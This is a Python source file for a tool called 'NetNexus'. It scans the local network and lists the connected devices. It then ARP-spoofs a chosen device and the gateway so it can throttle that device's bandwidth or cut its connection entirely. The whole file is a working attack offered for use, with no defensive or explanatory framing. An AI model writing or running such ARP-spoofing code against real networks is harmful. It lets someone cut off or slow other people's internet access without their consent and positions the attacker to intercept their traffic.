import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof

device_memory = {}
stop_scanner = False

def set_forwarding(state):
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
    else:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)

def apply_limit(iface, kbps):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
    subprocess.run(["sudo", "tc", "qdisc", "add", "dev", iface, "root", "tbf", "rate", f"{kbps}kbit", "latency", "50ms", "burst", "1540"], check=True)

def background_scanner(ip_range):
    global device_memory, stop_scanner
    while not stop_scanner:
        scanner.scan(ip_range, device_memory)
        time.sleep(2)

def main():
    global device_memory, stop_scanner
    iface = scapy.conf.iface
    
    if os.getuid() != 0:
        print("[-] Root required.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = f"{gateway_ip}/24"

    threading.Thread(target=background_scanner, args=(ip_range,), daemon=True).start()

    while True:
        os.system('clear')
        print("="*60)
        print("          NetNexus (Live Refresh)")
        print("="*60)
        print("ID\tIP\t\tMAC\t\t\tNAME")
        print("-" * 60)
        
        snapshot = list(device_memory.values())
        for i, dev in enumerate(snapshot):
            print(f"{i}\t{dev['ip']}\t{dev['mac']}\t{dev['name']}")
        
        print("-" * 60)
        choice = input("\nID (q to quit): ").lower()
        
        if choice == 'q':
            stop_scanner = True
            break
            
        try:
            target = snapshot[int(choice)]
            print(f"\n[1] Limit (kbps)  [2] Kill")
            mode = input("Action: ")

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            
            if mode == "1":
                kbps = input("kbps: ")
                set_forwarding(True)
                apply_limit(iface, kbps)
                wait_time = 0.5
            elif mode == "2":
                set_forwarding(False)
                wait_time = 0.05
            else: continue

            print(f"[*] Active on {target['ip']}... Ctrl+C to stop.")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time)
                
        except (KeyboardInterrupt, ValueError, IndexError):
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            spoof.restore(target['ip'], gateway_ip)
            continue

if __name__ == "__main__":
    main()
